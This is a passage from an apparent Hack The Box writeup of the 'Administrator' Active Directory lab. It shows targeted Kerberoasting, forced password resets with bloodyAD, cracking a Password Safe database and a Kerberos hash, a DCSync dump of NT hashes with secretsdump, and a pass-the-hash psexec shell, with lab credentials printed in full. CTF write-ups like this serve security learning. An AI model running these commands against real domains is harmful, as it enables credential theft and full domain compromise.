+</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>michael<span class=nv>$ADMINISTRATOR</span>.HTB<span class=nv>$administrator</span>.htb/michael*<span class=nv>$dab2d314b3a8bcacc9ddc48fcd143bfd$328623529607</span>e8f69d1d61bd484ae60354cad35d2bc2a81062cb5960cb4fff619cdd9b16257d3d3b01fe8c41f99df969c9ed29e804d800f02d5ba5d01d89dbf517e0fb7ed279d91863f14727f859f90706e7d8cc180ad8da9f5ee78ada48abbca066f5771f997e2f29294ab770ed1b9ad70607996c4e5dbeaf8ff5bf6363b59a50ed6861b47ce01547814d1ac2a76c4d04594dd91d7a93fa96ca76aa3288c7a62ec6611f820f103b755cbd4e11dca3120ca259aa221e40d084a1af5167d02d6b0f3f445bda2fc8475ec87b8c702d54c385f293495f3daa42b4d6c9cd9c34f743ca071ab8eeeaeced1644db5abac4c892c6bc78dab76192b61514bc87b5e75cff952fbd156afc2575cdfc5286902912fa5e3d5fd9793db08d2106a6ce80fd757a3a7afcde927a265617181158864aaf9312ae0d67cd504a0f1c4c4f1f246faf4764d201950d3e9644fb6c7f7d5e3f94b4ac48897cc002cfe79b6b983b8f9deb00d1699086d327bde6e62e8072bcacb46b8b3585ba993943e785a77f5d7e4d5fa0d6814aea06df72c2ca7513c03b7def9ae1f34d7e85a3852b9a2f313b281ec3b7e321161762bc65fe984bfeaa1afbab58ed2f0eae88e9758ea8d6264c3b552edad6b453a1cd5c2b8e5322e4b40ea8f074b99a8a4569b7e5d551f9f6eb4889b2745486aae238386e0002d9a807c9d240d7bf1a47f8803cf17921c920b3de1c45ae2efbd10b606e698f1f5cadcff7334227fca9b460c555ac843a65ba820a912bcfcf00a4d5c971b7781296ef9953089a744481546cfd1910080ca3912980a50333fbc35d16b7849fa91fa510b5bfd37c5326c4517a386407ab0c16910a1ae20c8d0c5c448d3dfcb2208e70a5f2d13f4b5eeacb13c686bfbf6b600ad9ba0426857f8a7fbb139abdd08ef6484359c3618b3da18e691c54d24ffd2aebdc39e61a910fe9bad37e447b5786fece50938d09ad5f04ff54144a26eb4387ef2caae5f4ee98fadaac51f477df9132a44da4311abe9e2ea0794b669ae510da5e29ab96dcd7b5643fbb1a050a250084bea52d13eb0a25ea843912442bce2c232f50b213c86ec8722bd5822554262dbf68f9a5abf0765d077dd54a50ab906de055f8b65cddfd3864468d8ceb7c8a02665a84fdf669869c5b656a0a8985b0b135067b4d98e7b747d1353182be7b9f641292ef56579cc6884460819e7cf9abea0fead04264d4a0c606092f479fe660b13a6d1cc1eb2dc51b200a5997ec4187e99ab224c8b8e1a7ccd0aa99ddd6f0e92c3fdcd933e3b7a4cc2ac67c565d00cd44339ffc075addd62e6ba819b75a615e259fbb77ce4823cd1da3512c883cdbda170a0c835a0d43648f2c990d0a550c2b34f4bfa66428b5ec1284dce2814b050ea13d30f15e77b96eb529ed970a02f18c41226c6e26b0b23fc2bd2d7ea6a9b04f23d93db758c40ef540c9e0082c638b9fedbf0810746862c3a4a89718ab36d19f6ae1c134a84e6e779a8151f0e252201496674dc8e6f00026329656cfa21f34342c
+</span></span><span class=line><span class=cl><span class=o>[</span>VERBOSE<span class=o>]</span> SPN removed successfully <span class=k>for</span> <span class=o>(</span>michael<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>So even though it&rsquo;s not recommended in real-life engagements, i changed the <code>michael</code>&rsquo;s password using <code>bloodyAD</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD -u <span class=s2>&#34;olivia&#34;</span> -p <span class=s2>&#34;ichliebedich&#34;</span> -d <span class=s2>&#34;Administrator.htb&#34;</span> --host <span class=s2>&#34;10.10.11.42&#34;</span> <span class=nb>set</span> password <span class=s2>&#34;Michael&#34;</span> <span class=s2>&#34;P@ssw0rd123&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
+</span></span></code></pre></td></tr></table></div></div><p>And then i will change <code>Benjamin</code>&rsquo;s password as well since we have now <code>ForceChangePassword</code> over it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ bloodyAD -u <span class=s2>&#34;Michael&#34;</span> -p <span class=s2>&#34;P@ssw0rd123&#34;</span> -d <span class=s2>&#34;Administrator.htb&#34;</span> --host <span class=s2>&#34;10.10.11.42&#34;</span> <span class=nb>set</span> password <span class=s2>&#34;Benjamin&#34;</span> <span class=s2>&#34;P@ssw0rd123&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password changed successfully!
+</span></span></code></pre></td></tr></table></div></div><p>I tried to access the <strong>ftp</strong> server using <code>Michael</code>&rsquo;s credentials but i couldn&rsquo;t, but we i did it using <code>Benjamin</code>&rsquo;s i succeed.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ftp 10.10.11.42
+</span></span><span class=line><span class=cl>Connected to 10.10.11.42.
+</span></span><span class=line><span class=cl><span class=m>220</span> Microsoft FTP Service
+</span></span><span class=line><span class=cl>Name <span class=o>(</span>10.10.11.42:ayoub<span class=o>)</span>: benjamin
+</span></span><span class=line><span class=cl><span class=m>331</span> Password required
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl><span class=m>230</span> User logged in.
+</span></span><span class=line><span class=cl>Remote system <span class=nb>type</span> is Windows_NT.
+</span></span><span class=line><span class=cl>ftp&gt; ls
+</span></span><span class=line><span class=cl><span class=m>229</span> Entering Extended Passive Mode <span class=o>(||</span><span class=p>|</span>61937<span class=p>|</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=m>125</span> Data connection already open<span class=p>;</span> Transfer starting.
+</span></span><span class=line><span class=cl>10-05-24  09:13AM                  <span class=m>952</span> Backup.psafe3
+</span></span><span class=line><span class=cl><span class=m>226</span> Transfer complete.
+</span></span></code></pre></td></tr></table></div></div><p>And as we can see above we got a <code>Backup.psafe3</code> file, which is a password database (in an encrypted format) file created by <strong>Password Safe</strong>, a popular open-source password management tool.</p><p>We can&rsquo;t read this file directly and we need <strong>a Master password</strong> that the database is protected with, so we will use <code>pwsafe2john</code> to convert the file into a format that <code>John</code> can process.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ pwsafe2john Backup.psafe3 &gt; hash.txt
+</span></span><span class=line><span class=cl>Backu:<span class=nv>$pwsafe$*</span>3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+</span></span></code></pre></td></tr></table></div></div><p>Then we will crack this using <code>rockyou.txt</code> wordlist using <code>john</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>~/Documents/HTB/Administrator<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ john --show hash.txt
+</span></span><span class=line><span class=cl>Backu:tekieromucho
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>1</span> password <span class=nb>hash</span> cracked, <span class=m>0</span> left
+</span></span></code></pre></td></tr></table></div></div><p>Used the password <code>tekieromucho</code> to open the database using <code>pwsafe</code>.</p><p><img src=/p/administrator-htb-writeup/pwsafe.png width=826 height=504 srcset="/p/administrator-htb-writeup/pwsafe_hu_cb0c18bb22dc6809.png 480w, /p/administrator-htb-writeup/pwsafe_hu_c74eabffd22dae74.png 1024w" loading=lazy alt=pwsafe class=gallery-image data-flex-grow=163 data-flex-basis=393px></p><p>We found the passwords of 3 users as seen below. We can get each user&rsquo;s password by right clicking on the user and chose copy the password to the clipboard.</p><p><img src=/p/administrator-htb-writeup/pwsafe1.png width=500 height=316 srcset="/p/administrator-htb-writeup/pwsafe1_hu_68e4dfbda1a1500b.png 480w, /p/administrator-htb-writeup/pwsafe1_hu_a8e1502e18288022.png 1024w" loading=lazy alt=pwsafe class=gallery-image data-flex-grow=158 data-flex-basis=379px></p><p>I looked into each of these users in <code>Bloodhound</code> and as a result the <code>Emily</code> have <code>CanPSRemote</code> on the Domain Controller, and most importantly it has <code>GenericWrite</code> on <code>Ethan</code> who have <code>DCSync</code> right on the Domain <code>Administrator.htb</code> which will lead us into domain compromise.</p><p><img src=/p/administrator-htb-writeup/Bloodhound33.png width=830 height=328 srcset="/p/administrator-htb-writeup/Bloodhound33_hu_1dcab84ac24ec3dd.png 480w, /p/administrator-htb-writeup/Bloodhound33_hu_853dd5b410949c5e.png 1024w" loading=lazy alt=Bloodhound class=gallery-image data-flex-grow=253 data-flex-basis=607px></p><p>I used <code>evil-winrm</code> to connect to the DC to get the <code>user.txt</code> flag.</p><p><img src=/evil.png loading=lazy alt=Evil-WinRM></p><p>Since we have <code>GenericWrite</code> on <code>Ethan</code> we will try to perform a targeted Kerberoasting first, and if the hash is not crackable we will be forced to change his password (not recommended in real-life!).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo ./targetedKerberoast.py -d <span class=s2>&#34;Administrator.htb&#34;</span> --dc-ip 10.10.11.42 -u <span class=s2>&#34;emily&#34;</span> -p <span class=s2>&#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#34;</span> 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting kerberoast attacks
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching usernames from Active Directory with LDAP
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>ethan<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23$*</span>ethan<span class=nv>$ADMINISTRATOR</span>.HTB<span class=nv>$Administrator</span>.htb/ethan*<span class=nv>$7</span>bed537141bd14d91ba9ec5be93a956b<span class=nv>$7</span>c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c
+</span></span></code></pre></td></tr></table></div></div><p>We got Lucky and the hash got cracked successfully. <code>Ethan</code>&rsquo;s password is <code>limpbizkit</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>hashcat</span><span class=p>-</span><span class=mf>6.2</span><span class=p>.</span><span class=mf>6</span><span class=p>&gt;</span> <span class=p>.\</span><span class=n>hashcat</span><span class=p>.</span><span class=py>exe</span> <span class=n>-m</span> <span class=mf>13100</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>acer</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>hash</span><span class=p>.</span><span class=py>txt</span> <span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>acer</span><span class=p>\</span><span class=n>Desktop</span><span class=p>\</span><span class=n>rockyou</span><span class=p>.</span><span class=py>txt</span>
+</span></span><span class=line><span class=cl><span class=n>hashcat</span> <span class=p>(</span><span class=n>v6</span><span class=p>.</span><span class=py>2</span><span class=p>.</span><span class=mf>6</span><span class=p>)</span> <span class=n>starting</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>OpenCL</span> <span class=n>API</span> <span class=p>(</span><span class=n>OpenCL</span> <span class=mf>2.1</span> <span class=p>)</span> <span class=p>-</span> <span class=n>Platform</span> <span class=c>#1 [Intel(R) Corporation]</span>
+</span></span><span class=line><span class=cl><span class=p>=============================================================</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Device</span> <span class=c>#1: Intel(R) UHD Graphics, 1536/3163 MB (790 MB allocatable), 24MCU</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=n>Device</span> <span class=c>#2: Intel(R) Core(TM) i7-10510U CPU @ 1.80GHz, skipped</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Minimum</span> <span class=n>password</span> <span class=n>length</span> <span class=n>supported</span> <span class=n>by</span> <span class=n>kernel</span><span class=err>:</span> <span class=mf>0</span>
+</span></span><span class=line><span class=cl><span class=n>Maximum</span> <span class=n>password</span> <span class=n>length</span> <span class=n>supported</span> <span class=n>by</span> <span class=n>kernel</span><span class=err>:</span> <span class=mf>256</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Hashes</span><span class=err>:</span> <span class=mf>1</span> <span class=n>digests</span><span class=p>;</span> <span class=mf>1</span> <span class=n>unique</span> <span class=n>digests</span><span class=p>,</span> <span class=mf>1</span> <span class=n>unique</span> <span class=n>salts</span>
+</span></span><span class=line><span class=cl><span class=n>Bitmaps</span><span class=err>:</span> <span class=mf>16</span> <span class=n>bits</span><span class=p>,</span> <span class=mf>65536</span> <span class=n>entries</span><span class=p>,</span> <span class=n>0x0000ffff</span> <span class=n>mask</span><span class=p>,</span> <span class=mf>262144</span> <span class=n>bytes</span><span class=p>,</span> <span class=mf>5</span><span class=p>/</span><span class=mf>13</span> <span class=n>rotates</span>
+</span></span><span class=line><span class=cl><span class=n>Rules</span><span class=err>:</span> <span class=mf>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>Optimizers</span> <span class=n>applied</span><span class=err>:</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=nb>Zero-Byte</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=nb>Not-Iterated</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=nb>Single-Hash</span>
+</span></span><span class=line><span class=cl><span class=p>*</span> <span class=nb>Single-Salt</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=n>SNIP</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>.</span>
+</span></span><span class=line><span class=cl><span class=p>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$krb5tgs$23</span><span class=p>$*</span><span class=n>ethan</span><span class=nv>$ADMINISTRATOR</span><span class=p>.</span><span class=n>HTB</span><span class=nv>$Administrator</span><span class=p>.</span><span class=n>htb</span><span class=p>/</span><span class=n>ethan</span><span class=p>*</span><span class=nv>$7bed537141bd14d91ba9ec5be93a956b$7c4184b5c470bd1bfeef1794bf3a54b3b246d35ca9d23eb544292a5e3331f28955b3381c00d3edf7d00d65c8d481e7ce6370ba842ad7068d3ec6f7725f138ae2ef4144f5422f35c9a27e9bb03870f5697bcbace85e4a7514d578e611a1c69e25d723afa0c01060e7b5e05639189f749cf994a4937ac1a3ff45c987f3985973f5000bacb87ca84765f889d8a70d652cf9fc9a928611bb49c4334b8923559a906b1b4b6d43a3ce180fed0be3475daab72d296613feba6f87e15d593a5cf7f9c9d81e9f44279e727e2ced375cb5022d7c26f64d4f7c1af67fa95f297cb0bafa1048b219158df8a21c16b44fb407c57232f9cafaad3693798d78bcbb989f6404f4ee58349dbb4478e31efc3d8eb686af9054f30c77dae7f0c9103cc7ddc3ea09dd5f81c3c6b000142fb51371ce05959b7fa830eb3a8fa006d0afa2a193c7bfcfb4868ad6a1c7497dbf4dc499bd19fffbdf8840c3faa074b1fc6dbddc849050aeafe55a71cf40297489a6cfbcc9cca26f5004fdb46187466c97646b289b5c486c6a443992da66a881960547b29237ec18cef499889d327926674f2e8f8de54d232eaa6875bf8cead86fd54f1a254335e286bfd6a9345de418d392e324ec79148184f6f6fc41ccaf42c850409ffa2b6bce9c37c619e5037a4394ad35dee0e49121da74d981d84ae8e386be5ed407f1d5cafc22ab8f74ee1870c4a3f3dac65763fba369e61baa086ebe7e109a1ef1ac329d73770e1e76b02740e895e8cce3b6013aeb3ba5717fb6ddbf12af3e69043b0f7e9e0d1f56ba158e6e49a47d96021766a9687537eec9485076f52982ffb5dae667bee6b92b0f6d594cc47f984e9bac0002ab3ac4105ed1a2de8ea9e8107e98a7d8455e3ec206edf2e4d29756809f7f1453e93b9b3dfe5a5763c9f234f68da0265ec886c47f05a16e31735c41c37f9126954e30080d6a57076c3f53cbfe9646f1d849f8ad60aec35f2c3bb87850d501a3597f26b4ad5f7d06a32bfdcc719ca701e8e4ad61280dd41035e354719affc7a10a2f1145487e458c6c1b20da2a78db81093e2666b54fe20b96fb7c8e1c891faef2b4103151d5a7779caa0d53fbbb0d0dea94a18b0d780536cd7e27f3c02afbed8fcb3dd54b8d194e64f895095c0f7047a38ddfcfba1e09b973408e95c2b9d26cd7f870e1969408cc3d6a5ddecdc29290cffc80fe951784b5c3f85a61425df971f37e3d83e8a0d8280814a38ff3ec99ead94bd2c9711a1f74f866295af0ec2a217def2dcf325e0ed27e15a912b00f08a797511665736dd26472bb3925fa591f44a2a511105f44a9a89480ef84a740ff7ae5859fbe71dbc15c1b2da91703bde841a07bcbf2708d262d2df115131d80563b12527316315361585bf59bb61b5bf52bc610ff3675415c26cc6d4e0e43c7370997f6049467a36ac080a1c95cbaa91baa729d992e8712f308303f1f73d1221095c237bb88c41a320eeee5bd96a03aadf0d354ed486ca41e56d48d2ce13f610c4ddbf2bade912767f2f20b5e71016021def06c</span><span class=err>:</span><span class=n>limpbizkit</span>
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s now <code>DCSync</code> the domain and dump all hashes of all users of the <code>administrator.htb</code> domain.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo secretsdump.py <span class=s2>&#34;Administrator.htb/ethan:limpbizkit&#34;</span>@<span class=s2>&#34;dc.Administrator.htb&#34;</span>
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+</span></span><span class=line><span class=cl>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class=line><span class=cl>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\o</span>livia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\m</span>ichael:1109:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\b</span>enjamin:1110:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\e</span>mily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\e</span>than:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\a</span>lexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+</span></span><span class=line><span class=cl>administrator.htb<span class=se>\e</span>mma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+</span></span><span class=line><span class=cl>DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.
+</span></span><span class=line><span class=cl>.
+</span></span><span class=line><span class=cl>.
+</span></span><span class=line><span class=cl>&lt;SNIP&gt;
+</span></span><span class=line><span class=cl>.
+</span></span><span class=line><span class=cl>.
+</span></span></code></pre></td></tr></table></div></div><p>Finally, we will use the <code>psexec.py</code> to get a shell as the <code>administrator</code> using his NT hash that we got from above, and then get the <code>root.txt</code> flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>ayoub㉿MyKali<span class=o>)</span>-<span class=o>[</span>/opt/targetedKerberoast<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ psexec.py <span class=s1>&#39;administrator.htb/Administrator@10.10.11.42&#39;</span> -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e
+</span></span><span class=line><span class=cl>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.11.42.....
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Uploading file HpFTdtnz.exe
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.11.42.....
